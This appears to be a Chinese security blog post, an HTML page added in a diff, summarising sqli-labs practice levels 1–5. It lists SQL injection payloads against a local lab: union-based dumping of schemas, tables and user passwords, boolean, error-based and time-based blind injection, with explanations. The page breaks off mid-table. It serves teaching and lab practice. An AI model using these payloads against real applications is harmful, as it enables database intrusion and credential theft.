@@ -1,0 +1,1988 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="generator" content="Hexo 3.9.0">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/128x128.ico?v=7.3.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/128x128.ico?v=7.3.0">
+  <meta name="google-site-verification" content="GGFme5OaJm26Z2TDjB--Ol2pfQANqnR69mkuVsw70rU">
+
+<link rel="stylesheet" href="/css/main.css?v=7.3.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/fancybox/source/jquery.fancybox.css">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2">
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.3.0',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    search: {
+      root: '/',
+      path: 'search.xml'
+    },
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'copy',
+      copy_success: 'succeed',
+      copy_failure: 'failed'
+    }
+  };
+</script>
+
+  <meta name="description" content="Sql 语句为  $sql=&amp;quot;SELECT*FROM users WHERE id= &amp;#39;$id&amp;#39; LIMIT0,1&amp;quot;; Less1   注入语句 数据库语句    http://127.0.0.1/Range/sqli-labs-master/Less-1/?id=-1&amp;#39;  or 1=2 --+ Select * from where id=&amp;#39;">
+<meta name="keywords" content="sql">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqli_lab总结">
+<meta property="og:url" content="https://wh0ale.github.io/2019/02/18/sqli_lab总结/index.html">
+<meta property="og:site_name" content="Wh0ale&#39;s Blog">
+<meta property="og:description" content="Sql 语句为  $sql=&amp;quot;SELECT*FROM users WHERE id= &amp;#39;$id&amp;#39; LIMIT0,1&amp;quot;; Less1   注入语句 数据库语句    http://127.0.0.1/Range/sqli-labs-master/Less-1/?id=-1&amp;#39;  or 1=2 --+ Select * from where id=&amp;#39;">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0azmfymnpj211x0scadu.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ar97l8jyj20lo06tt8p.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0av8vev7yj20pk08lmxs.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0avads55pj20ug08v779.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0avai46xij20vy08hacq.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0avcbxr3ej20z505f0ss.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ave1s42fj20ak089glh.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0avgkznhpj20q50k7n6m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0avgt5dq0j20jd0cgmxs.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0aw8ct5zuj20dl0aojxa.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0aw9986d7j207m096n6m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awcf8u3vj20kz0bg779.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awcm7vjgj20ox0asgqf.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awj5x8n7j20my08wn6m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awjjqlh0j20dm02fmxs.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awsr0asej20ug06qn6m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awtbp8fqj20qi03p40d.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awuwpzvej205w053n6m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awv0g4xij20bz09240d.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awv6x8scj20bp067779.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awvfe79hj20f706dgqf.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awvqdizbj20nq0dzabp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awxjb8vmj20ss06dn6m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0awy8lbukj20s90c7dkz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ax3aojmbj211b03gjxa.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ax3e3kbcj211m03jdg6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0axxtlyudj20ls0din6m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0axylri4hj20hr0akdkz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0axzzo6o1j20ff0ad779.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay2nl6mzj20ho0a7n6m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay3uhbfzj20kd0agdkz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay4giujgj20kv0b9779.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay4q14gcj20ma0aggqf.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay6au6auj20mn0boabp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ay7lbcg5j20m40awjra.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayc3zzx7j20mn0czn6m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayd11rf3j20mg0cfdkz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayd96325j20mp0as779.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0aydphjwej20mi0atgqf.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayf7cat1j20xm0j8abp.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayfp6qipj213h0guq4d.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayfycybjj20qq0o2jxa.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayio3zqsj20nq0b50tr.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayk3u4qyj20wh06rn6m.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayksx06sj20uw03pdkz.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayl2d362j20x40gw779.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayo757taj20ty0dfgqf.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ayvk5kgzj20qh0en76v.jpg">
+<meta property="og:updated_time" content="2019-10-15T08:31:04.757Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="sqli_lab总结">
+<meta name="twitter:description" content="Sql 语句为  $sql=&amp;quot;SELECT*FROM users WHERE id= &amp;#39;$id&amp;#39; LIMIT0,1&amp;quot;; Less1   注入语句 数据库语句    http://127.0.0.1/Range/sqli-labs-master/Less-1/?id=-1&amp;#39;  or 1=2 --+ Select * from where id=&amp;#39;">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0azmfymnpj211x0scadu.jpg">
+  <link rel="alternate" href="/atom.xml" title="Wh0ale's Blog" type="application/atom+xml">
+  <link rel="canonical" href="https://wh0ale.github.io/2019/02/18/sqli_lab总结/">
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>sqli_lab总结 | Wh0ale's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Wh0ale's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+    <ul id="menu" class="menu">
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+      
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+      
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+      
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-sitemap">
+      
+    
+
+    <a href="/sitemap.xml" rel="section"><i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-search">
+          <a href="javascript:;" class="popup-trigger">
+          
+            <i class="menu-item-icon fa fa-search fa-fw"></i> <br>搜索</a>
+        </li>
+      
+    </ul>
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+    </div>
+</nav>
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    <div class="reading-progress-bar"></div>
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://wh0ale.github.io/2019/02/18/sqli_lab总结/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wh0ale">
+      <meta itemprop="description" content="No master and rookie，only hardworking and lazy.">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Wh0ale's Blog">
+    </span>
+      <header class="post-header">
+
+        
+          <h1 class="post-title" itemprop="name headline">sqli_lab总结
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+        
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-02-18 00:00:00" itemprop="dateCreated datePublished" datetime="2019-02-18T00:00:00+08:00">2019-02-18</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-10-15 16:31:04" itemprop="dateModified" datetime="2019-10-15T16:31:04+08:00">2019-10-15</time>
+              </span>
+            
+          
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon"
+              >
+                <i class="fa fa-eye"></i>
+                 阅读次数： 
+                <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+              </span>
+            </span>
+          <br>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span title="本文字数">31k</span>
+            </span>
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span title="阅读时长">28 分钟</span>
+            </span>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+
+
+      
+        <p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0azmfymnpj211x0scadu.jpg" alt></p>
+<p>Sql 语句为  <code>$sql=&quot;SELECT*FROM users WHERE id= &#39;$id&#39; LIMIT0,1&quot;;</code></p>
+<h1 id="Less1"><a href="#Less1" class="headerlink" title="Less1"></a>Less1</h1><table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><a href="http://127.0.0.1/Range/sqli-labs-master/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/Range/sqli-labs-master/Less-1/?id=-1&#39;</a>  or 1=2 --+</td>
+<td>Select * from where id=&#39;-1&#39;or1=1--+&#39;LIMIT0,1</td>
+</tr>
+<tr>
+<td><a href="http://127.0.0.1/Range/sqli-labs-master/Less-1/?id=-1&#39;" target="_blank" rel="noopener">http://127.0.0.1/Range/sqli-labs-master/Less-1/?id=-1&#39;</a> union select 1,2--+</td>
+<td>Select * from where id=&#39;-1&#39;union select 1,2 --+</td>
+</tr>
+<tr>
+<td>?id=-1&#39;   union select 1,group_concat(schema_name),3   from information_schema.SCHEMATA --+</td>
+<td>SELECT * FROM users WHERE id=&#39;-1&#39;union select 1,group_concat(schema _name),3  --from   information_schema.schemata--+ LIMIT 0,1</td>
+</tr>
+<tr>
+<td>?id=-1&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+</td>
+<td>SELECT * FROM users WHERE id=&#39;-1&#39;union   select 1,group_concat(table_n ame),3 from information_schema.tables where   table_schema=&#39;security&#39;--+ LIMIT 0,1</td>
+</tr>
+<tr>
+<td>?id=-1&#39;   union select 1,group_concat(column_name),3 from information_schema.columns   where table_name=&#39;users&#39; --+</td>
+<td>SELECT * FROM users WHERE id=&#39;-1&#39;union select   1,group_concat(column _name),3 from information_schema.columns where   table_name=&#39;users&#39;--+ LIMIT 0,1</td>
+</tr>
+<tr>
+<td>?id=-1&#39;   union select 1,username,password from users where id=2 --+</td>
+<td>SELECT * FROM users WHERE id=&#39;-1&#39;union select 1,username,password   f rom users where id=2--+ LIMIT 0,1</td>
+</tr>
+</tbody></table>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0ar97l8jyj20lo06tt8p.jpg" alt></p>
+<h1 id="Less2"><a href="#Less2" class="headerlink" title="Less2"></a>Less2</h1><p>报错：<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39; LIMIT 0,1&#39; at line 1</code></p>
+<p>Sql 语句为  <code>Select * from TABLE where id = (some integer value);  LIMIT0,1&quot;;</code></p>
+<p>第一关是 &#39;$id&#39;</p>
+<p>第二关是 $id</p>
+<table>
+<thead>
+<tr>
+<th>注入语句：</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1   or 1=1 --+</td>
+<td>$sql=&quot;SELECT * FROM users WHERE id= $id LIMIT0,1&quot;;</td>
+</tr>
+</tbody></table>
+<h1 id="Less3"><a href="#Less3" class="headerlink" title="Less3"></a>Less3</h1><p>推测sql语句为：<code>select login_name,select password from table where id = (&#39;our input here&#39;)</code></p>
+<table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1&#39;)   or &#39;1&#39;=&#39;1&#39; --+</td>
+<td>$sql=&quot;SELECT *  FROM users WHERE id = (&#39;$id&#39;) LIMIT0,1&quot;;</td>
+</tr>
+<tr>
+<td>?id=1&#39;)   or &#39;1&#39;=(&#39;1</td>
+<td>$sql=&quot;SELECT *  FROM users WHERE id = (&#39;$id&#39;) LIMIT0,1&quot;;</td>
+</tr>
+</tbody></table>
+<h1 id="Less4"><a href="#Less4" class="headerlink" title="Less4"></a>Less4</h1><table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1&quot;)   or 1=1 --+</td>
+<td>$sql=&quot;SELECT *  FROM users WHERE id = (&quot;$id&quot;) LIMIT0,1&quot;;</td>
+</tr>
+</tbody></table>
+<h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><h2 id="基于布尔-SQL-盲注-构造逻辑判断"><a href="#基于布尔-SQL-盲注-构造逻辑判断" class="headerlink" title="基于布尔 SQL 盲注----------构造逻辑判断"></a>基于布尔 SQL 盲注----------构造逻辑判断</h2><table>
+<thead>
+<tr>
+<th>left(database(),1)&gt;&#39;s&#39;</th>
+<th>left()函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>ascii(substr((select   table_name information_schema.tables where tables_schema =database()limit   0,1),1,1))=101 --+</td>
+<td>substr()函数，ascii()函数</td>
+</tr>
+<tr>
+<td>ascii(substr((select   database()),1,1))=98</td>
+<td>substr(a,b,c)从   b 位置开始，截取字符串 a 的 c 长度。Ascii()将某个字符转换 为   ascii 值</td>
+</tr>
+<tr>
+<td>ORD(MID((SELECT   IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT   0,1),1,1))&gt;98%23</td>
+<td>mid(a,b,c)从位置   b 开始，截取 a 字符串的 c 位   Ord()函数同   ascii()，将字符转为 ascii 值</td>
+</tr>
+<tr>
+<td>select   user() regexp &#39;^[a-z]&#39;;</td>
+<td>user()结果为   root，regexp 为匹配 root 的正则表达式。</td>
+</tr>
+<tr>
+<td>select   user() like &#39;ro%</td>
+<td>like   匹配注入</td>
+</tr>
+</tbody></table>
+<h2 id="基于报错的-SQL-盲注-构造-payload-让信息通过错误提示回显出来"><a href="#基于报错的-SQL-盲注-构造-payload-让信息通过错误提示回显出来" class="headerlink" title="基于报错的 SQL 盲注------构造 payload 让信息通过错误提示回显出来"></a>基于报错的 SQL 盲注------构造 payload 让信息通过错误提示回显出来</h2><table>
+<thead>
+<tr>
+<th>Select   1,count(<em>),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)</em>2)) a   from information_schema.columns group by a;</th>
+<th>explain:此处有三个点，一是需要   concat 计数，二是 floor，取得 0 or 1，进行数据的 重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时 重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将   rand(0)，rand()需 要多试几次才行</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>select   count(<em>) from information_schema.tables group by concat(version(),   floor(rand(0)</em>2))</td>
+<td>以上语句可以简化成如下的形式</td>
+</tr>
+<tr>
+<td>select   count(<em>) from (select 1 union select null union   select   !1) group by concat(version(),floor(rand(0)</em>2))</td>
+<td>如果关键的表被禁用了，可以使用这种形式</td>
+</tr>
+<tr>
+<td>select   min(@a:=1) from information_schema.tables group by concat(passwo   rd,@a:=(@a+1)%2)</td>
+<td>如果   rand 被禁用了可以使用用户变量来报错</td>
+</tr>
+<tr>
+<td>select   exp(~(select * FROM(SELECT USER())a))</td>
+<td>double   数值类 型超出范围</td>
+</tr>
+<tr>
+<td>extractvalue(1,concat(0x7e,(select   @@version),0x7e)) se</td>
+<td>mysql   对 xml 数据进 行查询和修改的 xpath 函数，xpath 语法错误</td>
+</tr>
+<tr>
+<td>updatexml(1,concat(0x7e,(select   @@version),0x7e),1)</td>
+<td>mysql对xml数据进行   查询和修改的 xpath 函数，xpath 语法错误</td>
+</tr>
+<tr>
+<td>select   * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</td>
+<td>mysql   重复特性，此处重复了 version，所以报错。</td>
+</tr>
+</tbody></table>
+<h2 id="基于时间的-SQL-盲注-延时注入"><a href="#基于时间的-SQL-盲注-延时注入" class="headerlink" title="基于时间的 SQL 盲注----------延时注入"></a>基于时间的 SQL 盲注----------延时注入</h2><table>
+<thead>
+<tr>
+<th>If(ascii(substr(database(),1,1))&gt;115,0,sleep(5))%23</th>
+<th>if   判断语句，条件为假， 执行 sleep</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>select   sleep(find_in_set(mid(@@version, 1, 1), &#39;0,1,2,3,4,5,6,7,8, 9,.&#39;));</td>
+<td>该语句意思是在   0-9 之间找版本号的第一位。但是在我们实际渗透过程中，这种用法是不可 取的，因为时间会有网速等其他因素的影响，所以会影响结果的判断。</td>
+</tr>
+</tbody></table>
+<p> <img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0av8vev7yj20pk08lmxs.jpg" alt></p>
+<h1 id="Less5"><a href="#Less5" class="headerlink" title="Less5"></a>Less5</h1><p>回显错误信息，但是不回显数据库中的数据</p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1&#39;and   left(version(),1)=5 --+</td>
+<td>返回php版本号5.6.17</td>
+</tr>
+<tr>
+<td>?id=1&#39;and   length(database())=8 --+</td>
+<td>返回数据库语句</td>
+</tr>
+<tr>
+<td>?id=1&#39;and left(database(),1)&gt;&#39;a&#39; --+</td>
+<td>查看数据库第一位是否大于a</td>
+</tr>
+<tr>
+<td>?id=1&#39;and left(database(),1)&gt;&#39;sa&#39; --+</td>
+<td>查看数据库前两位是否大于   sa</td>
+</tr>
+<tr>
+<td>?id=1&#39;and   ascii(substr((select table_name from information_schema.tables where   table_schema=database() limit    0,1),1,1))=101 --+   此处同样的使用二分法进行测试，直到测试正确为止。 此处应该是 101，因为第一个表示 email。</td>
+<td>limit取第一行   substr取数据库第一位的长度</td>
+</tr>
+<tr>
+<td>?id=1&#39;and   ascii(substr((select table_name from information_schema.tables where   table_schema=database() limit    0,1),2,1))=109 --+</td>
+<td>limit取第一行   substr取数据库第一位的长度</td>
+</tr>
+<tr>
+<td>?id=1&#39;and   ascii(substr((select table_name from information_schema.tables where   table_schema=database() limit    1,1),1,1))=114 --+</td>
+<td>imit0,1.   意思就是从第 0 个开始，获取第一个。那 要获取第二个是不是就是 limit1,1</td>
+</tr>
+<tr>
+<td>?id=1&#39;   and 1=(select 1 from information_schema.columns where table_name=&#39;users&#39; and   table_name regexp &#39;^us[a-z]&#39; limit 0,1)--+   利用 regexp 获取中 users 表中的列</td>
+<td>选择   users表中的列名是否有 us**的列   select 1 from 这个是什么意思</td>
+</tr>
+<tr>
+<td>?id=1&#39;   and ORD(MID((SELECT IFNULL(CAST(username   AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))= 68--+   ord（）和 mid（）函数获取 users 表的内容</td>
+<td>mid(a,b,c)从位置   b 开始，截取 a 字符串的 c 位   Ord()函数同   ascii()，将字符转为 ascii 值</td>
+</tr>
+</tbody></table>
+<p> <img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0avads55pj20ug08v779.jpg" alt></p>
+<p> <img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g0avai46xij20vy08hacq.jpg" alt></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><table>
+<thead>
+<tr>
+<th>注入语句</th>
+<th>数据库语句</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>?id=1&#39;   union Select 1,count(<em>),concat(0x3a,0x3a,(select   user()),0x3a,0x3a,floor(rand(0)</em>2))a from information_schema.columns group by a --+</td>
+<td>explain:此处有三个点，一是需要   concat 计数，二是 floor，取得 0 or 1，进行数据的 重复，三是 group by 进行分组，但具体原理解释不是很通，大致原理为分组后数据计数时 重复造成的错误。也有解释为 mysql 的 bug 的问题。但是此处需要将   rand(0)，rand()需 要多试几次才行</td>
+</tr>
+<tr>
+<td>?id=1&#39;   union select (exp(<del>(select * from(select user())a))),2,3 --+   select exp(</del>(select * FROM(SELECT USER())a))</td>
+<td>double   数值类 型超出范围   Exp()为以   e 为底的对数函数；版本在 5.5.5 及其以上   exp 报错文章： <a href="http://www.cnblogs.com/lcamry/articles/5509124.html" target="_blank" rel="noopener">http://www.cnblogs.com/lcamry/articles/5509124.html</a></td>
+</tr>
+<tr>
+<td>?id=1&#39;   union select (!(select * from (select user())x) - ~0),2,3 --+   select   !(select * from (select user())x) -（ps:这是减号） ~0</td>
